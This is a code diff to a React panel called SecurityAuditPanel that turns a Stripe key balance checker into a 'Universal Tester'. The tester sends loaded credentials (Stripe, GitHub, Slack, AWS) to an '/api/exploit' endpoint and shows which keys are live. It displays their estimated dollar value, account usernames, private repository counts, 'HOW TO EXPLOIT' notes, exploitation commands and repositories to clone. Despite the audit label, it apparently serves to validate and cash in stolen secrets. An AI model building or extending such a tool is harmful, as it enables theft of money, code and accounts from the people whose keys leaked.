@@ -833,19 +833,18 @@ export default function SecurityAuditPanel() {
                     <DollarSign className="w-8 h-8 text-green-400" />
                   </div>
                   <div>
-                    <h3 className="text-white font-bold text-lg">Balance Checker</h3>
-                    <p className="text-gray-400 text-sm">Check Stripe account balances</p>
+                    <h3 className="text-white font-bold text-lg">Universal Tester</h3>
+                    <p className="text-gray-400 text-sm">Test ALL credentials + Show exploitation methods</p>
                   </div>
                 </div>
                 <button
                   onClick={async () => {
-                    const stripeKeys = results.filter(r => r.category === 'financial');
-                    if (!stripeKeys.length) return alert('No Stripe keys found');
-                    const maxKeys = 500;
-                    const keysToCheck = stripeKeys.length > maxKeys ? maxKeys : stripeKeys.length;
-                    if (!confirm(`Check ${keysToCheck} Stripe keys? (Limited to ${maxKeys} max)\n\nEstimated time: ${Math.ceil(keysToCheck / 10)} seconds`)) return;
+                    if (!results.length) return alert('No credentials loaded');
+                    const maxCreds = 300;
+                    const credsToTest = results.length > maxCreds ? maxCreds : results.length;
+                    if (!confirm(`Test ${credsToTest} credentials?\n\nThis will test Stripe, GitHub, Slack, AWS and show exploitation methods.\n\nEstimated time: ${Math.ceil(credsToTest / 10)} seconds`)) return;
                     setLoading(true);
-                    setLoadingText(`Checking ${keysToCheck} Stripe balances...`);
+                    setLoadingText(`Testing ${credsToTest} credentials...`);
                     try {
                       const controller = new AbortController();
                       const timeout = setTimeout(() => controller.abort(), 300000); // 5 min max
@@ -853,16 +852,16 @@ export default function SecurityAuditPanel() {
                       const response = await fetch(`${API_URL}/api/exploit/check-balances`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json', 'x-admin-key': adminKey },
-                        body: JSON.stringify({ credentials: stripeKeys.slice(0, maxKeys), batchSize: 100 }),
+                        body: JSON.stringify({ credentials: results.slice(0, maxCreds), batchSize: 100 }),
                         signal: controller.signal
                       });
                       clearTimeout(timeout);
                       const data = await response.json();
                       if (data.success) {
                         setExploitResults({ type: 'balance', data });
-                        const msg = `Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`;
-                        if (stripeKeys.length > maxKeys) {
-                          alert(msg + `\n\nNote: Limited to ${maxKeys} keys. Load fewer credentials or run multiple batches.`);
+                        const msg = `Tested ${data.checked} credentials\n\nStripe: ${data.summary.byType?.stripe || 0} LIVE\nGitHub: ${data.summary.byType?.github || 0} ACTIVE\nSlack: ${data.summary.byType?.slack || 0} ACTIVE\nAWS: ${data.summary.byType?.aws || 0} keys\n\nTOTAL VALUE: $${data.summary.totalValue.toFixed(2)}`;
+                        if (results.length > maxCreds) {
+                          alert(msg + `\n\nNote: Limited to ${maxCreds} credentials. Load fewer or run multiple batches.`);
                         } else {
                           alert(msg);
                         }
@@ -880,10 +879,10 @@ export default function SecurityAuditPanel() {
                   }}
                   className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-semibold transition disabled:bg-gray-600"
                 >
-                  Check Balances ({results.filter(r => r.category === 'financial').length})
+                  Test All ({results.length})
                 </button>
                 <div className="mt-3 text-xs text-gray-400">
-                  Shows available balance for each Stripe key
+                  Tests Stripe, GitHub, Slack, AWS + Shows exploitation commands
                 </div>
               </div>
 
@@ -988,35 +987,77 @@ export default function SecurityAuditPanel() {
                   <div className="space-y-3">
                     <div className="bg-green-900/30 border border-green-500 rounded-lg p-4">
                       <div className="text-green-400 font-bold text-3xl">${exploitResults.data.summary.totalValue.toFixed(2)}</div>
-                      <div className="text-gray-300">Total Balance Available</div>
+                      <div className="text-gray-300">Total Estimated Value</div>
                     </div>
-                    <div className="grid grid-cols-3 gap-3">
-                      <div className="bg-gray-800 p-3 rounded-lg text-center">
-                        <div className="text-green-400 font-bold text-2xl">{exploitResults.data.summary.live}</div>
-                        <div className="text-gray-400 text-sm">LIVE</div>
+                    <div className="grid grid-cols-4 gap-3">
+                      <div className="bg-green-900/30 p-3 rounded-lg text-center">
+                        <div className="text-green-400 font-bold text-xl">{exploitResults.data.summary.byType?.stripe || 0}</div>
+                        <div className="text-gray-400 text-xs">Stripe LIVE</div>
                       </div>
-                      <div className="bg-gray-800 p-3 rounded-lg text-center">
-                        <div className="text-red-400 font-bold text-2xl">{exploitResults.data.summary.dead}</div>
-                        <div className="text-gray-400 text-sm">DEAD</div>
+                      <div className="bg-purple-900/30 p-3 rounded-lg text-center">
+                        <div className="text-purple-400 font-bold text-xl">{exploitResults.data.summary.byType?.github || 0}</div>
+                        <div className="text-gray-400 text-xs">GitHub ACTIVE</div>
                       </div>
-                      <div className="bg-gray-800 p-3 rounded-lg text-center">
-                        <div className="text-blue-400 font-bold text-2xl">{exploitResults.data.checked}</div>
-                        <div className="text-gray-400 text-sm">CHECKED</div>
+                      <div className="bg-yellow-900/30 p-3 rounded-lg text-center">
+                        <div className="text-yellow-400 font-bold text-xl">{exploitResults.data.summary.byType?.slack || 0}</div>
+                        <div className="text-gray-400 text-xs">Slack ACTIVE</div>
+                      </div>
+                      <div className="bg-blue-900/30 p-3 rounded-lg text-center">
+                        <div className="text-blue-400 font-bold text-xl">{exploitResults.data.summary.byType?.aws || 0}</div>
+                        <div className="text-gray-400 text-xs">AWS Keys</div>
                       </div>
                     </div>
-                    <div className="max-h-96 overflow-y-auto space-y-2">
+                    <div className="max-h-96 overflow-y-auto space-y-3">
                       {exploitResults.data.results.map((r, i) => (
-                        <div key={i} className={`p-4 rounded-lg ${r.status === 'LIVE' ? 'bg-green-900/30 border border-green-500' : 'bg-gray-800'}`}>
-                          <div className="flex items-center justify-between">
-                            <div className="flex-1">
-                              <div className="text-white font-mono text-sm">{r.key}</div>
-                              {r.source && <div className="text-gray-400 text-xs mt-1">{r.source}</div>}
+                        <div key={i} className={`p-4 rounded-lg border ${
+                          r.status === 'LIVE' || r.status === 'ACTIVE' ? 'bg-green-900/30 border-green-500' : 
+                          r.status === 'NEEDS_SECRET' ? 'bg-blue-900/30 border-blue-500' :
+                          'bg-gray-800 border-gray-700'
+                        }`}>
+                          <div className="flex items-center justify-between mb-2">
+                            <div className="flex items-center gap-2">
+                              <span className={`px-2 py-1 rounded text-xs font-bold ${
+                                r.type === 'Stripe' ? 'bg-green-600' :
+                                r.type === 'GitHub' ? 'bg-purple-600' :
+                                r.type === 'Slack' ? 'bg-yellow-600' :
+                                'bg-blue-600'
+                              } text-white`}>{r.type}</span>
+                              <span className={`font-bold ${
+                                r.status === 'LIVE' || r.status === 'ACTIVE' ? 'text-green-400' : 
+                                r.status === 'NEEDS_SECRET' ? 'text-blue-400' :
+                                'text-red-400'
+                              }`}>{r.status}</span>
                             </div>
-                            <div className="text-right">
-                              <div className={`font-bold text-lg ${r.status === 'LIVE' ? 'text-green-400' : 'text-red-400'}`}>{r.status}</div>
-                              {r.balance !== undefined && <div className="text-green-400 font-bold text-xl">${r.balance.toFixed(2)}</div>}
-                            </div>
+                            {r.value && <div className="text-green-400 font-bold text-lg">${r.value}</div>}
                           </div>
+                          
+                          {r.username && <div className="text-white mb-1">👤 {r.username}</div>}
+                          {r.workspace && <div className="text-white mb-1">🏢 {r.workspace}</div>}
+                          {r.balance && <div className="text-green-400 font-bold text-xl mb-2">{r.balance}</div>}
+                          {r.privateRepos !== undefined && <div className="text-purple-400 mb-1">📦 {r.privateRepos} private repos</div>}
+                          
+                          {r.exploit && (
+                            <div className="bg-gray-900 p-3 rounded mt-2">
+                              <div className="text-yellow-400 text-xs font-bold mb-1">💡 HOW TO EXPLOIT:</div>
+                              <div className="text-gray-300 text-xs mb-2">{r.exploit}</div>
+                              {r.commands && r.commands.length > 0 && (
+                                <div>
+                                  <div className="text-blue-400 text-xs font-bold mb-1">⚡ COMMANDS:</div>
+                                  {r.commands.map((cmd, idx) => (
+                                    <div key={idx} className="bg-black p-2 rounded mb-1">
+                                      <code className="text-green-400 text-xs">{cmd}</code>
+                                    </div>
+                                  ))}
+                                </div>
+                              )}
+                              {r.repos && r.repos.length > 0 && (
+                                <div className="mt-2">
+                                  <div className="text-purple-400 text-xs font-bold mb-1">📂 REPOS TO CLONE:</div>
+                                  <div className="text-gray-400 text-xs">{r.repos.slice(0, 3).join(', ')}{r.repos.length > 3 ? ` +${r.repos.length - 3} more` : ''}</div>
+                                </div>
+                              )}
+                            </div>
+                          )}
                         </div>
                       ))}
                     </div>
